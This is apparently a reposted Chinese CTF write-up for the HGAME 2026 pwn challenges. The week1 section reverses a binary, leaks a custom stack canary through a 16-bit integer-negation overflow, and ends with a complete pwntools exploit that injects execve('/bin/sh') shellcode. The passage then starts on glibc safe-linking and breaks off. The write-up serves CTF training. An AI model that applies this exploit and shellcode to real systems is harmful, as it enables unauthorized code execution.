---
title: HGAME 2026复现
url: https://mp.weixin.qq.com/s/f4xaKqwVt6j4rL76F2F3NA
source: Doonsec's feed
date: 2026-03-14
fetch_date: 2026-03-15T04:26:27.489704
---

# HGAME 2026复现

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Cpo2XCpI7K34CsDywtL3YHnpYu4VGSTWPg6l8vK0PCRwj0URqVla78ibpATJoGicvQd6ITCwymeO7Va4TbmOudxO8yd2JWz5rDxEC1yM6V7ro/0?wx_fmt=jpeg)

# HGAME 2026复现

G0t1T
G0t1T

看雪学苑

![]()

在小说阅读器中沉浸阅读

**week1-adrift**

# 看保护

查看保护，发现栈有可执行权限，猜测跟ret2shellcode有关：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K3ficnh3ys7ib7jnNicDXvibPIr2HhhvicfgblXOPkG2ZNtiaIc5PQdic0sfSht7dtwhibEh6IFLNln7WbxOZj7wHlIjcMN4dtLHd8u9Ac/640?wx_fmt=png&from=appmsg)

## 逆源码

### main

```
int __fastcall main(int argc, constchar **argv, constchar **envp){
  _QWORD *v3; // rdx
  __int16 v4; // ax
  __int16 v6[2]; // [rsp+0h] [rbp-400h] BYREF
  __int16 i; // [rsp+4h] [rbp-3FCh]
  _QWORD v8[125]; // [rsp+6h] [rbp-3FAh] BYREF
  __int64 v9; // [rsp+3F0h] [rbp-10h]

init_canary(argc, argv, envp);
  v9 = canary;
putchar(10);
while ( 1 )
  {
printf("choose> ");
    __isoc99_scanf("%hd", v6);
switch ( v6[0] )
    {
case 0:
printf("way> ");
read(0, v8, 0x410uLL);
printf("distance> ");
for ( i = 0; i <= 200 && dis[i]; ++i )
          ;
        v3 = (_QWORD *)((char *)&str + 1304 * i);
        *v3 = v8[0];
        v3[124] = v8[124];
qmemcpy(
          (void *)((unsigned __int64)(v3 + 1) & 0xFFFFFFFFFFFFFFF8LL),
          (constvoid *)((char *)v8 - ((char *)v3 - ((unsigned __int64)(v3 + 1) & 0xFFFFFFFFFFFFFFF8LL))),
8LL * ((((_DWORD)v3 - (((_DWORD)v3 + 8) & 0xFFFFFFF8) + 1000) & 0xFFFFFFF8) >> 3));
memset(v8, 0, sizeof(v8));
        __isoc99_scanf("%lu", &dis[i]);
break;
case 1:
delete();
break;
case 2:
show();
break;
case 3:
printf("index> ");
        __isoc99_scanf("%hd", v6);
        v4 = v6[0];
if ( v6[0] <= 0 )
          v4 = -v6[0];
        v6[0] = v4;
if ( v4 > 200 )
        {
puts("invalid index");
        }
else
        {
printf("a new distance> ");
          __isoc99_scanf("%lu", &dis[v6[0]]);
        }
break;
case 4:
if ( v9 != canary )
        {
printf("it's a poor decision :(");
exit(0);
        }
return 0;
default:
continue;
    }
  }
}
```

main函数设置了一个canary，checksec才看不出来。从canary = (\_\_int64)&v1可以看出，这个canary是全局变量，存放栈上的地址。

```
init_canary(argc, argv, envp);
v9 = canary;

__int64 *init_canary()
{
  __int64 *result; // rax
  __int64 v1; // [rsp+8h] [rbp-8h] BYREF

setvbuf(stdout, 0LL, 2, 0LL);
setvbuf(stdin, 0LL, 2, 0LL);
setvbuf(stderr, 0LL, 2, 0LL);
  v1 = (__int64)&v1;
  result = &v1;
  canary = (__int64)&v1;
return result;
}
```

接着在while循环里用了个switch，对应四种功能，首先看case 0，因为v8[128]的空间是0x3e8，跟rbp的距离是0x3FA，而read(0, v8, 0x410uLL);则会导致栈溢出，溢出长度是0x28，可以覆盖到返回地址+0x6的位置。注意memset(v8, 0, sizeof(v8));会清空v8的内容。

![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K07Gn7hYPTNx6wib3xB3dicRKknmqxNNHGxPIXb2YHjMWoRsLwVzdPtRGD48LxJxsUgjxyx4PUKQyr3uh9owGKAIic2YuW9GgQO0M/640?wx_fmt=png&from=appmsg)![]()![]()![]()

### delete

```
int delete()
{
  __int16 v1; // [rsp+Eh] [rbp-2h]

printf("index> ");
  __isoc99_scanf("%hd");
  dis[v1 % 201] = 0LL;
return printf("%hd", (unsigned int)(v1 % 201));
}
```

这里对应case 1，把dis数组对应索引位置清0.

### show

```
intshow(){
  __int64 v0; // rax
  __int16 v2; // [rsp+Eh] [rbp-2h] BYREF

printf("index> ");
  __isoc99_scanf("%hd", &v2);
LOWORD(v0) = v2;
if ( v2 <= 0 )
LOWORD(v0) = -v2;
  v2 = v0;
LODWORD(v0) = (unsigned __int16)v0;
if ( (__int16)v0 <= 199 )
  {
    v0 = dis[v2];
if ( v0 )
LODWORD(v0) = printf(": %lu\n", dis[v2]);
  }
return v0;
}
```

这个函数用来打印dis对应索引的值，要求索引值是正数。但这里存在个问题LOWORD(v0) = -v2;首先%hd输入的是两个字节，v2是用补码表示的，-v2则是将v2做取反运算再+1。

比如说

`+5`二进制是`101`：

* `0000 0000 0000 0101`

  （十六进制`0x0005`）

对`0x0005`：

* 按位取反：`1111 1111 1111 1010`（`0xFFFA`）
* 再 +1：`1111 1111 1111 1011`（`0xFFFB`）

所以：

* `-5`

  的 16 位补码 =`1111 1111 1111 1011`（`0xFFFB`）

对`-5`的比特`0xFFFB`：

* 按位取反：`0000 0000 0000 0100`（`0x0004`）
* 再 +1：`0000 0000 0000 0101`（`0x0005`）

得到：

* `0x0005`

  =`+5`

**这里有个特殊情况**：最小负数无法变成正数。

比如 16 位有符号数的最小值是`-32768`，它的相反数`32768`超出范围，会溢出，取反+1后反而等于自身。

可以看到canary在dis的低地址方向，差了0x40000，再除以8，刚好等于32768，所以我们可以输入index为-32768达到数组越界打印canary，从而泄露栈地址。

![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K3bicKh2yT0KmT3QVjUW590mxB8Ga2icCvtNm7CZSlFXl6HMLqYeJqOfNiaz0MB1x0hFu7a8ibQQ9bnp4CAGbzGsAamZa4MYfx5iaBs/640?wx_fmt=png&from=appmsg)![]()![]()![]()

### case3

![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K2HWoSAb04sicCHZjwhCoHX83ENEg71rJGEqwxswZNE9pOibgfGuVOryiaA8r7iaiaiaJZYibtXiaia87MK94uDQfALwjFahMRYt5NibHE2E/640?wx_fmt=png&from=appmsg)![]()![]()![]()

case3同样存在整数溢出的问题，输入index为-32768，就可以修改canary值

### case4

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K3Eviawdiaia0X01bOFZISaxDdUa81bRoM1PU2W0jcFVGRG3bibicX1jG03GMA4kUtadeWMRzZgPxRgkIegHn1AC0rz9hjelheibz8lI/640?wx_fmt=png&from=appmsg)![]()![]()![]()

检查canary值

## 思路

1. 选择case2打印canary的值，泄露栈地址。
2. 选择case3修改canary的值，绕过case4的检查。
3. 选择case0的栈溢出写入shellcode，并将返回地址覆盖为shellcode的地址（通过调试计算偏移）
4. 选择case4触发shellcode执行

需要注意写入的shellcode只能写到返回地址之前，返回地址需要存放shellcode的地址，所以shellcode最多只能写入0x1A（0x3FA-0x3E8+0x8）。不过这里为了方便对齐，我直接从rbp-0x10（注意这里要修改canary的值等于shellcode的前八个字节，绕过检查）开始写，只写入0x18长度的shellcode。

## 偏移

把断点打在设置canary之后，查看canary的值，存着栈地址：

![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K1SHI8MkwWlbFh6rTZUDxAZ0UvG9MibfByNXzDMkrbEhiaWEuMxF9Lo5W4c5WEWQCKuPctiawiaialOH5X6ia934trdibmVRCPaXCwPUw/640?wx_fmt=png&from=appmsg)![]()![]()![]()

再看rbp的值：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K30iaL3R0miaOKb6EJovg8jhwYWxuxISggGQiaCiaAGISUR3LfXw1bPrQu9dqUbHlhNktQRHDR5ZBCkVicdibZhtjCVcFQxdk0xh4icUo/640?wx_fmt=png&from=appmsg)![]()![]()![]()

计算到canary也就是rbp-0x10的偏移是0x408，后面我们泄露出栈地址，加上这个偏移就是shellcode的地址了。

![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K3yD55nzLYKbZpUGpyGOuQqgApHt6xFMmia75s3OZL4wAqRSUxmQxh1uQkT1BfL0e0WKs6mmyvhANLyyMVgv9EUfFw4XLzfHZfM/640?wx_fmt=png&from=appmsg)![]()![]()![]()

## EXP

```
from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
io = process('./vuln')
#io = remote("cloud-middle.hgame.vidar.club",32265)
io.sendlineafter(b"choose> ",b"2")
io.sendlineafter(b"index> ",b"-32768")
io.recvuntil(b": ")
aa = int(io.recvuntil(b"\n",drop=True))
log.success(hex(aa))
shellcode = asm('''
        pop r11
    mov rax, 0x68732f6e69622f
        push rax
        push rsp
        pop rdi
        xor eax, eax
        mov al, 59
        xor rdx, rdx
        syscall
''')# 因为rsp和shellcode挨得很近，两次push会破坏shellcode，所以这里我先pop一次抬高rsp的地址
# rsi在调试的时候发现是0，就不用去赋值了
log.info(len(shellcode))
addr = aa + 0x408
log.success(hex(addr))
payload = b'a'*(0x3e8+2)+shellcode+p64(addr)
io.sendlineafter(b"choose> ",b"3")
io.sendlineafter(b"index> ",b"-32768")
n = int.from_bytes(shellcode[:8], byteorder="little", signed=False)
log.success(hex(n))
io.sendlineafter(b"a new distance> ", str(n).encode())
io.sendlineafter(b"choose> ",b"0")
# gdb.attach(io,'b *$rebase(0x14EE)')
# pause()
io.sendafter(b"way> ",payload)
io.sendlineafter(b"distance> ",b'233')
io.sendlineafter(b"choose> ",b"4")
io.interactive()
```

#

**week2-diary keeper**

```
patchelf --set-interpreter /home/glibc-all-in-one/libs/2.35-0ubuntu3.13_amd64/ld-linux-x86-64.so.2 ./vuln
patchelf --replace-needed libc.so.6 /home/glibc-all-in-one/libs/2.35-0ubuntu3.13_amd64/libc.so.6 ./vuln
```

## safe-linking

在2.32版本，ptmalloc引入了PROTECT\_PTR，即保护指针的概念，其指针是被异或加密的，如果对系统的堆地址一无所知，将无法正确解读泄露的指针的真实值。

tcache\_put当然也引入了这一机制，其next指针(fd)将会与entry首块进行异或加密。

![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K2SM6FDwicBgzQUcjGWfhIWmb56APdLVlUVnQ1jGVOaTMl3JrnR2ibelOa1ibiawfW7WBwMhmFIAjVwJvkU42v3FGYlqa5w4vOH4zg/640?wx_fmt=png&from=appmsg)![]()![]()![]()

```
#definePROTECT_PTR(pos, ptr) \
((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
```

结合两个代码，其实就是e->next =((&e->next) >> 12 ) ^ tcache -> entries[tc\_idx]

触发这个 PROTECT\_PTR 宏，有两种情况：

第一种是当前 free 的堆块是第一个进入 tcache bin 的（此前 tcache bin 中没有堆块），这种情况原本 next 的值就是 0 。第二种情况则是原本的 next 值已经有数据了。

如果是第一种情况的话，对于 safe-Linking 机制而言，可能并没有起到预期的作用，因为将当前堆地址右移 12 位和 0 异或，其实值没有改变，如果我们能泄露出这个运算后的结果，再将其左移 12 位就可以反推出来堆地址，如果有了堆地址之后，那我们依然可以篡改 next 指针，达到任意地址申请的效果。

举个栗子：

当前tcachebins是空的：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K0OBlkJO5xS85icCywnfEYvlQia1L8Xd9ajcK70tDXVpGtEqfyPdCeaJ1ckMwjNnDfWHIDhKhibeXv1nVbibey9pdTicY7uUVco6Sy0/640?wx_fmt=png&from=appmsg)!...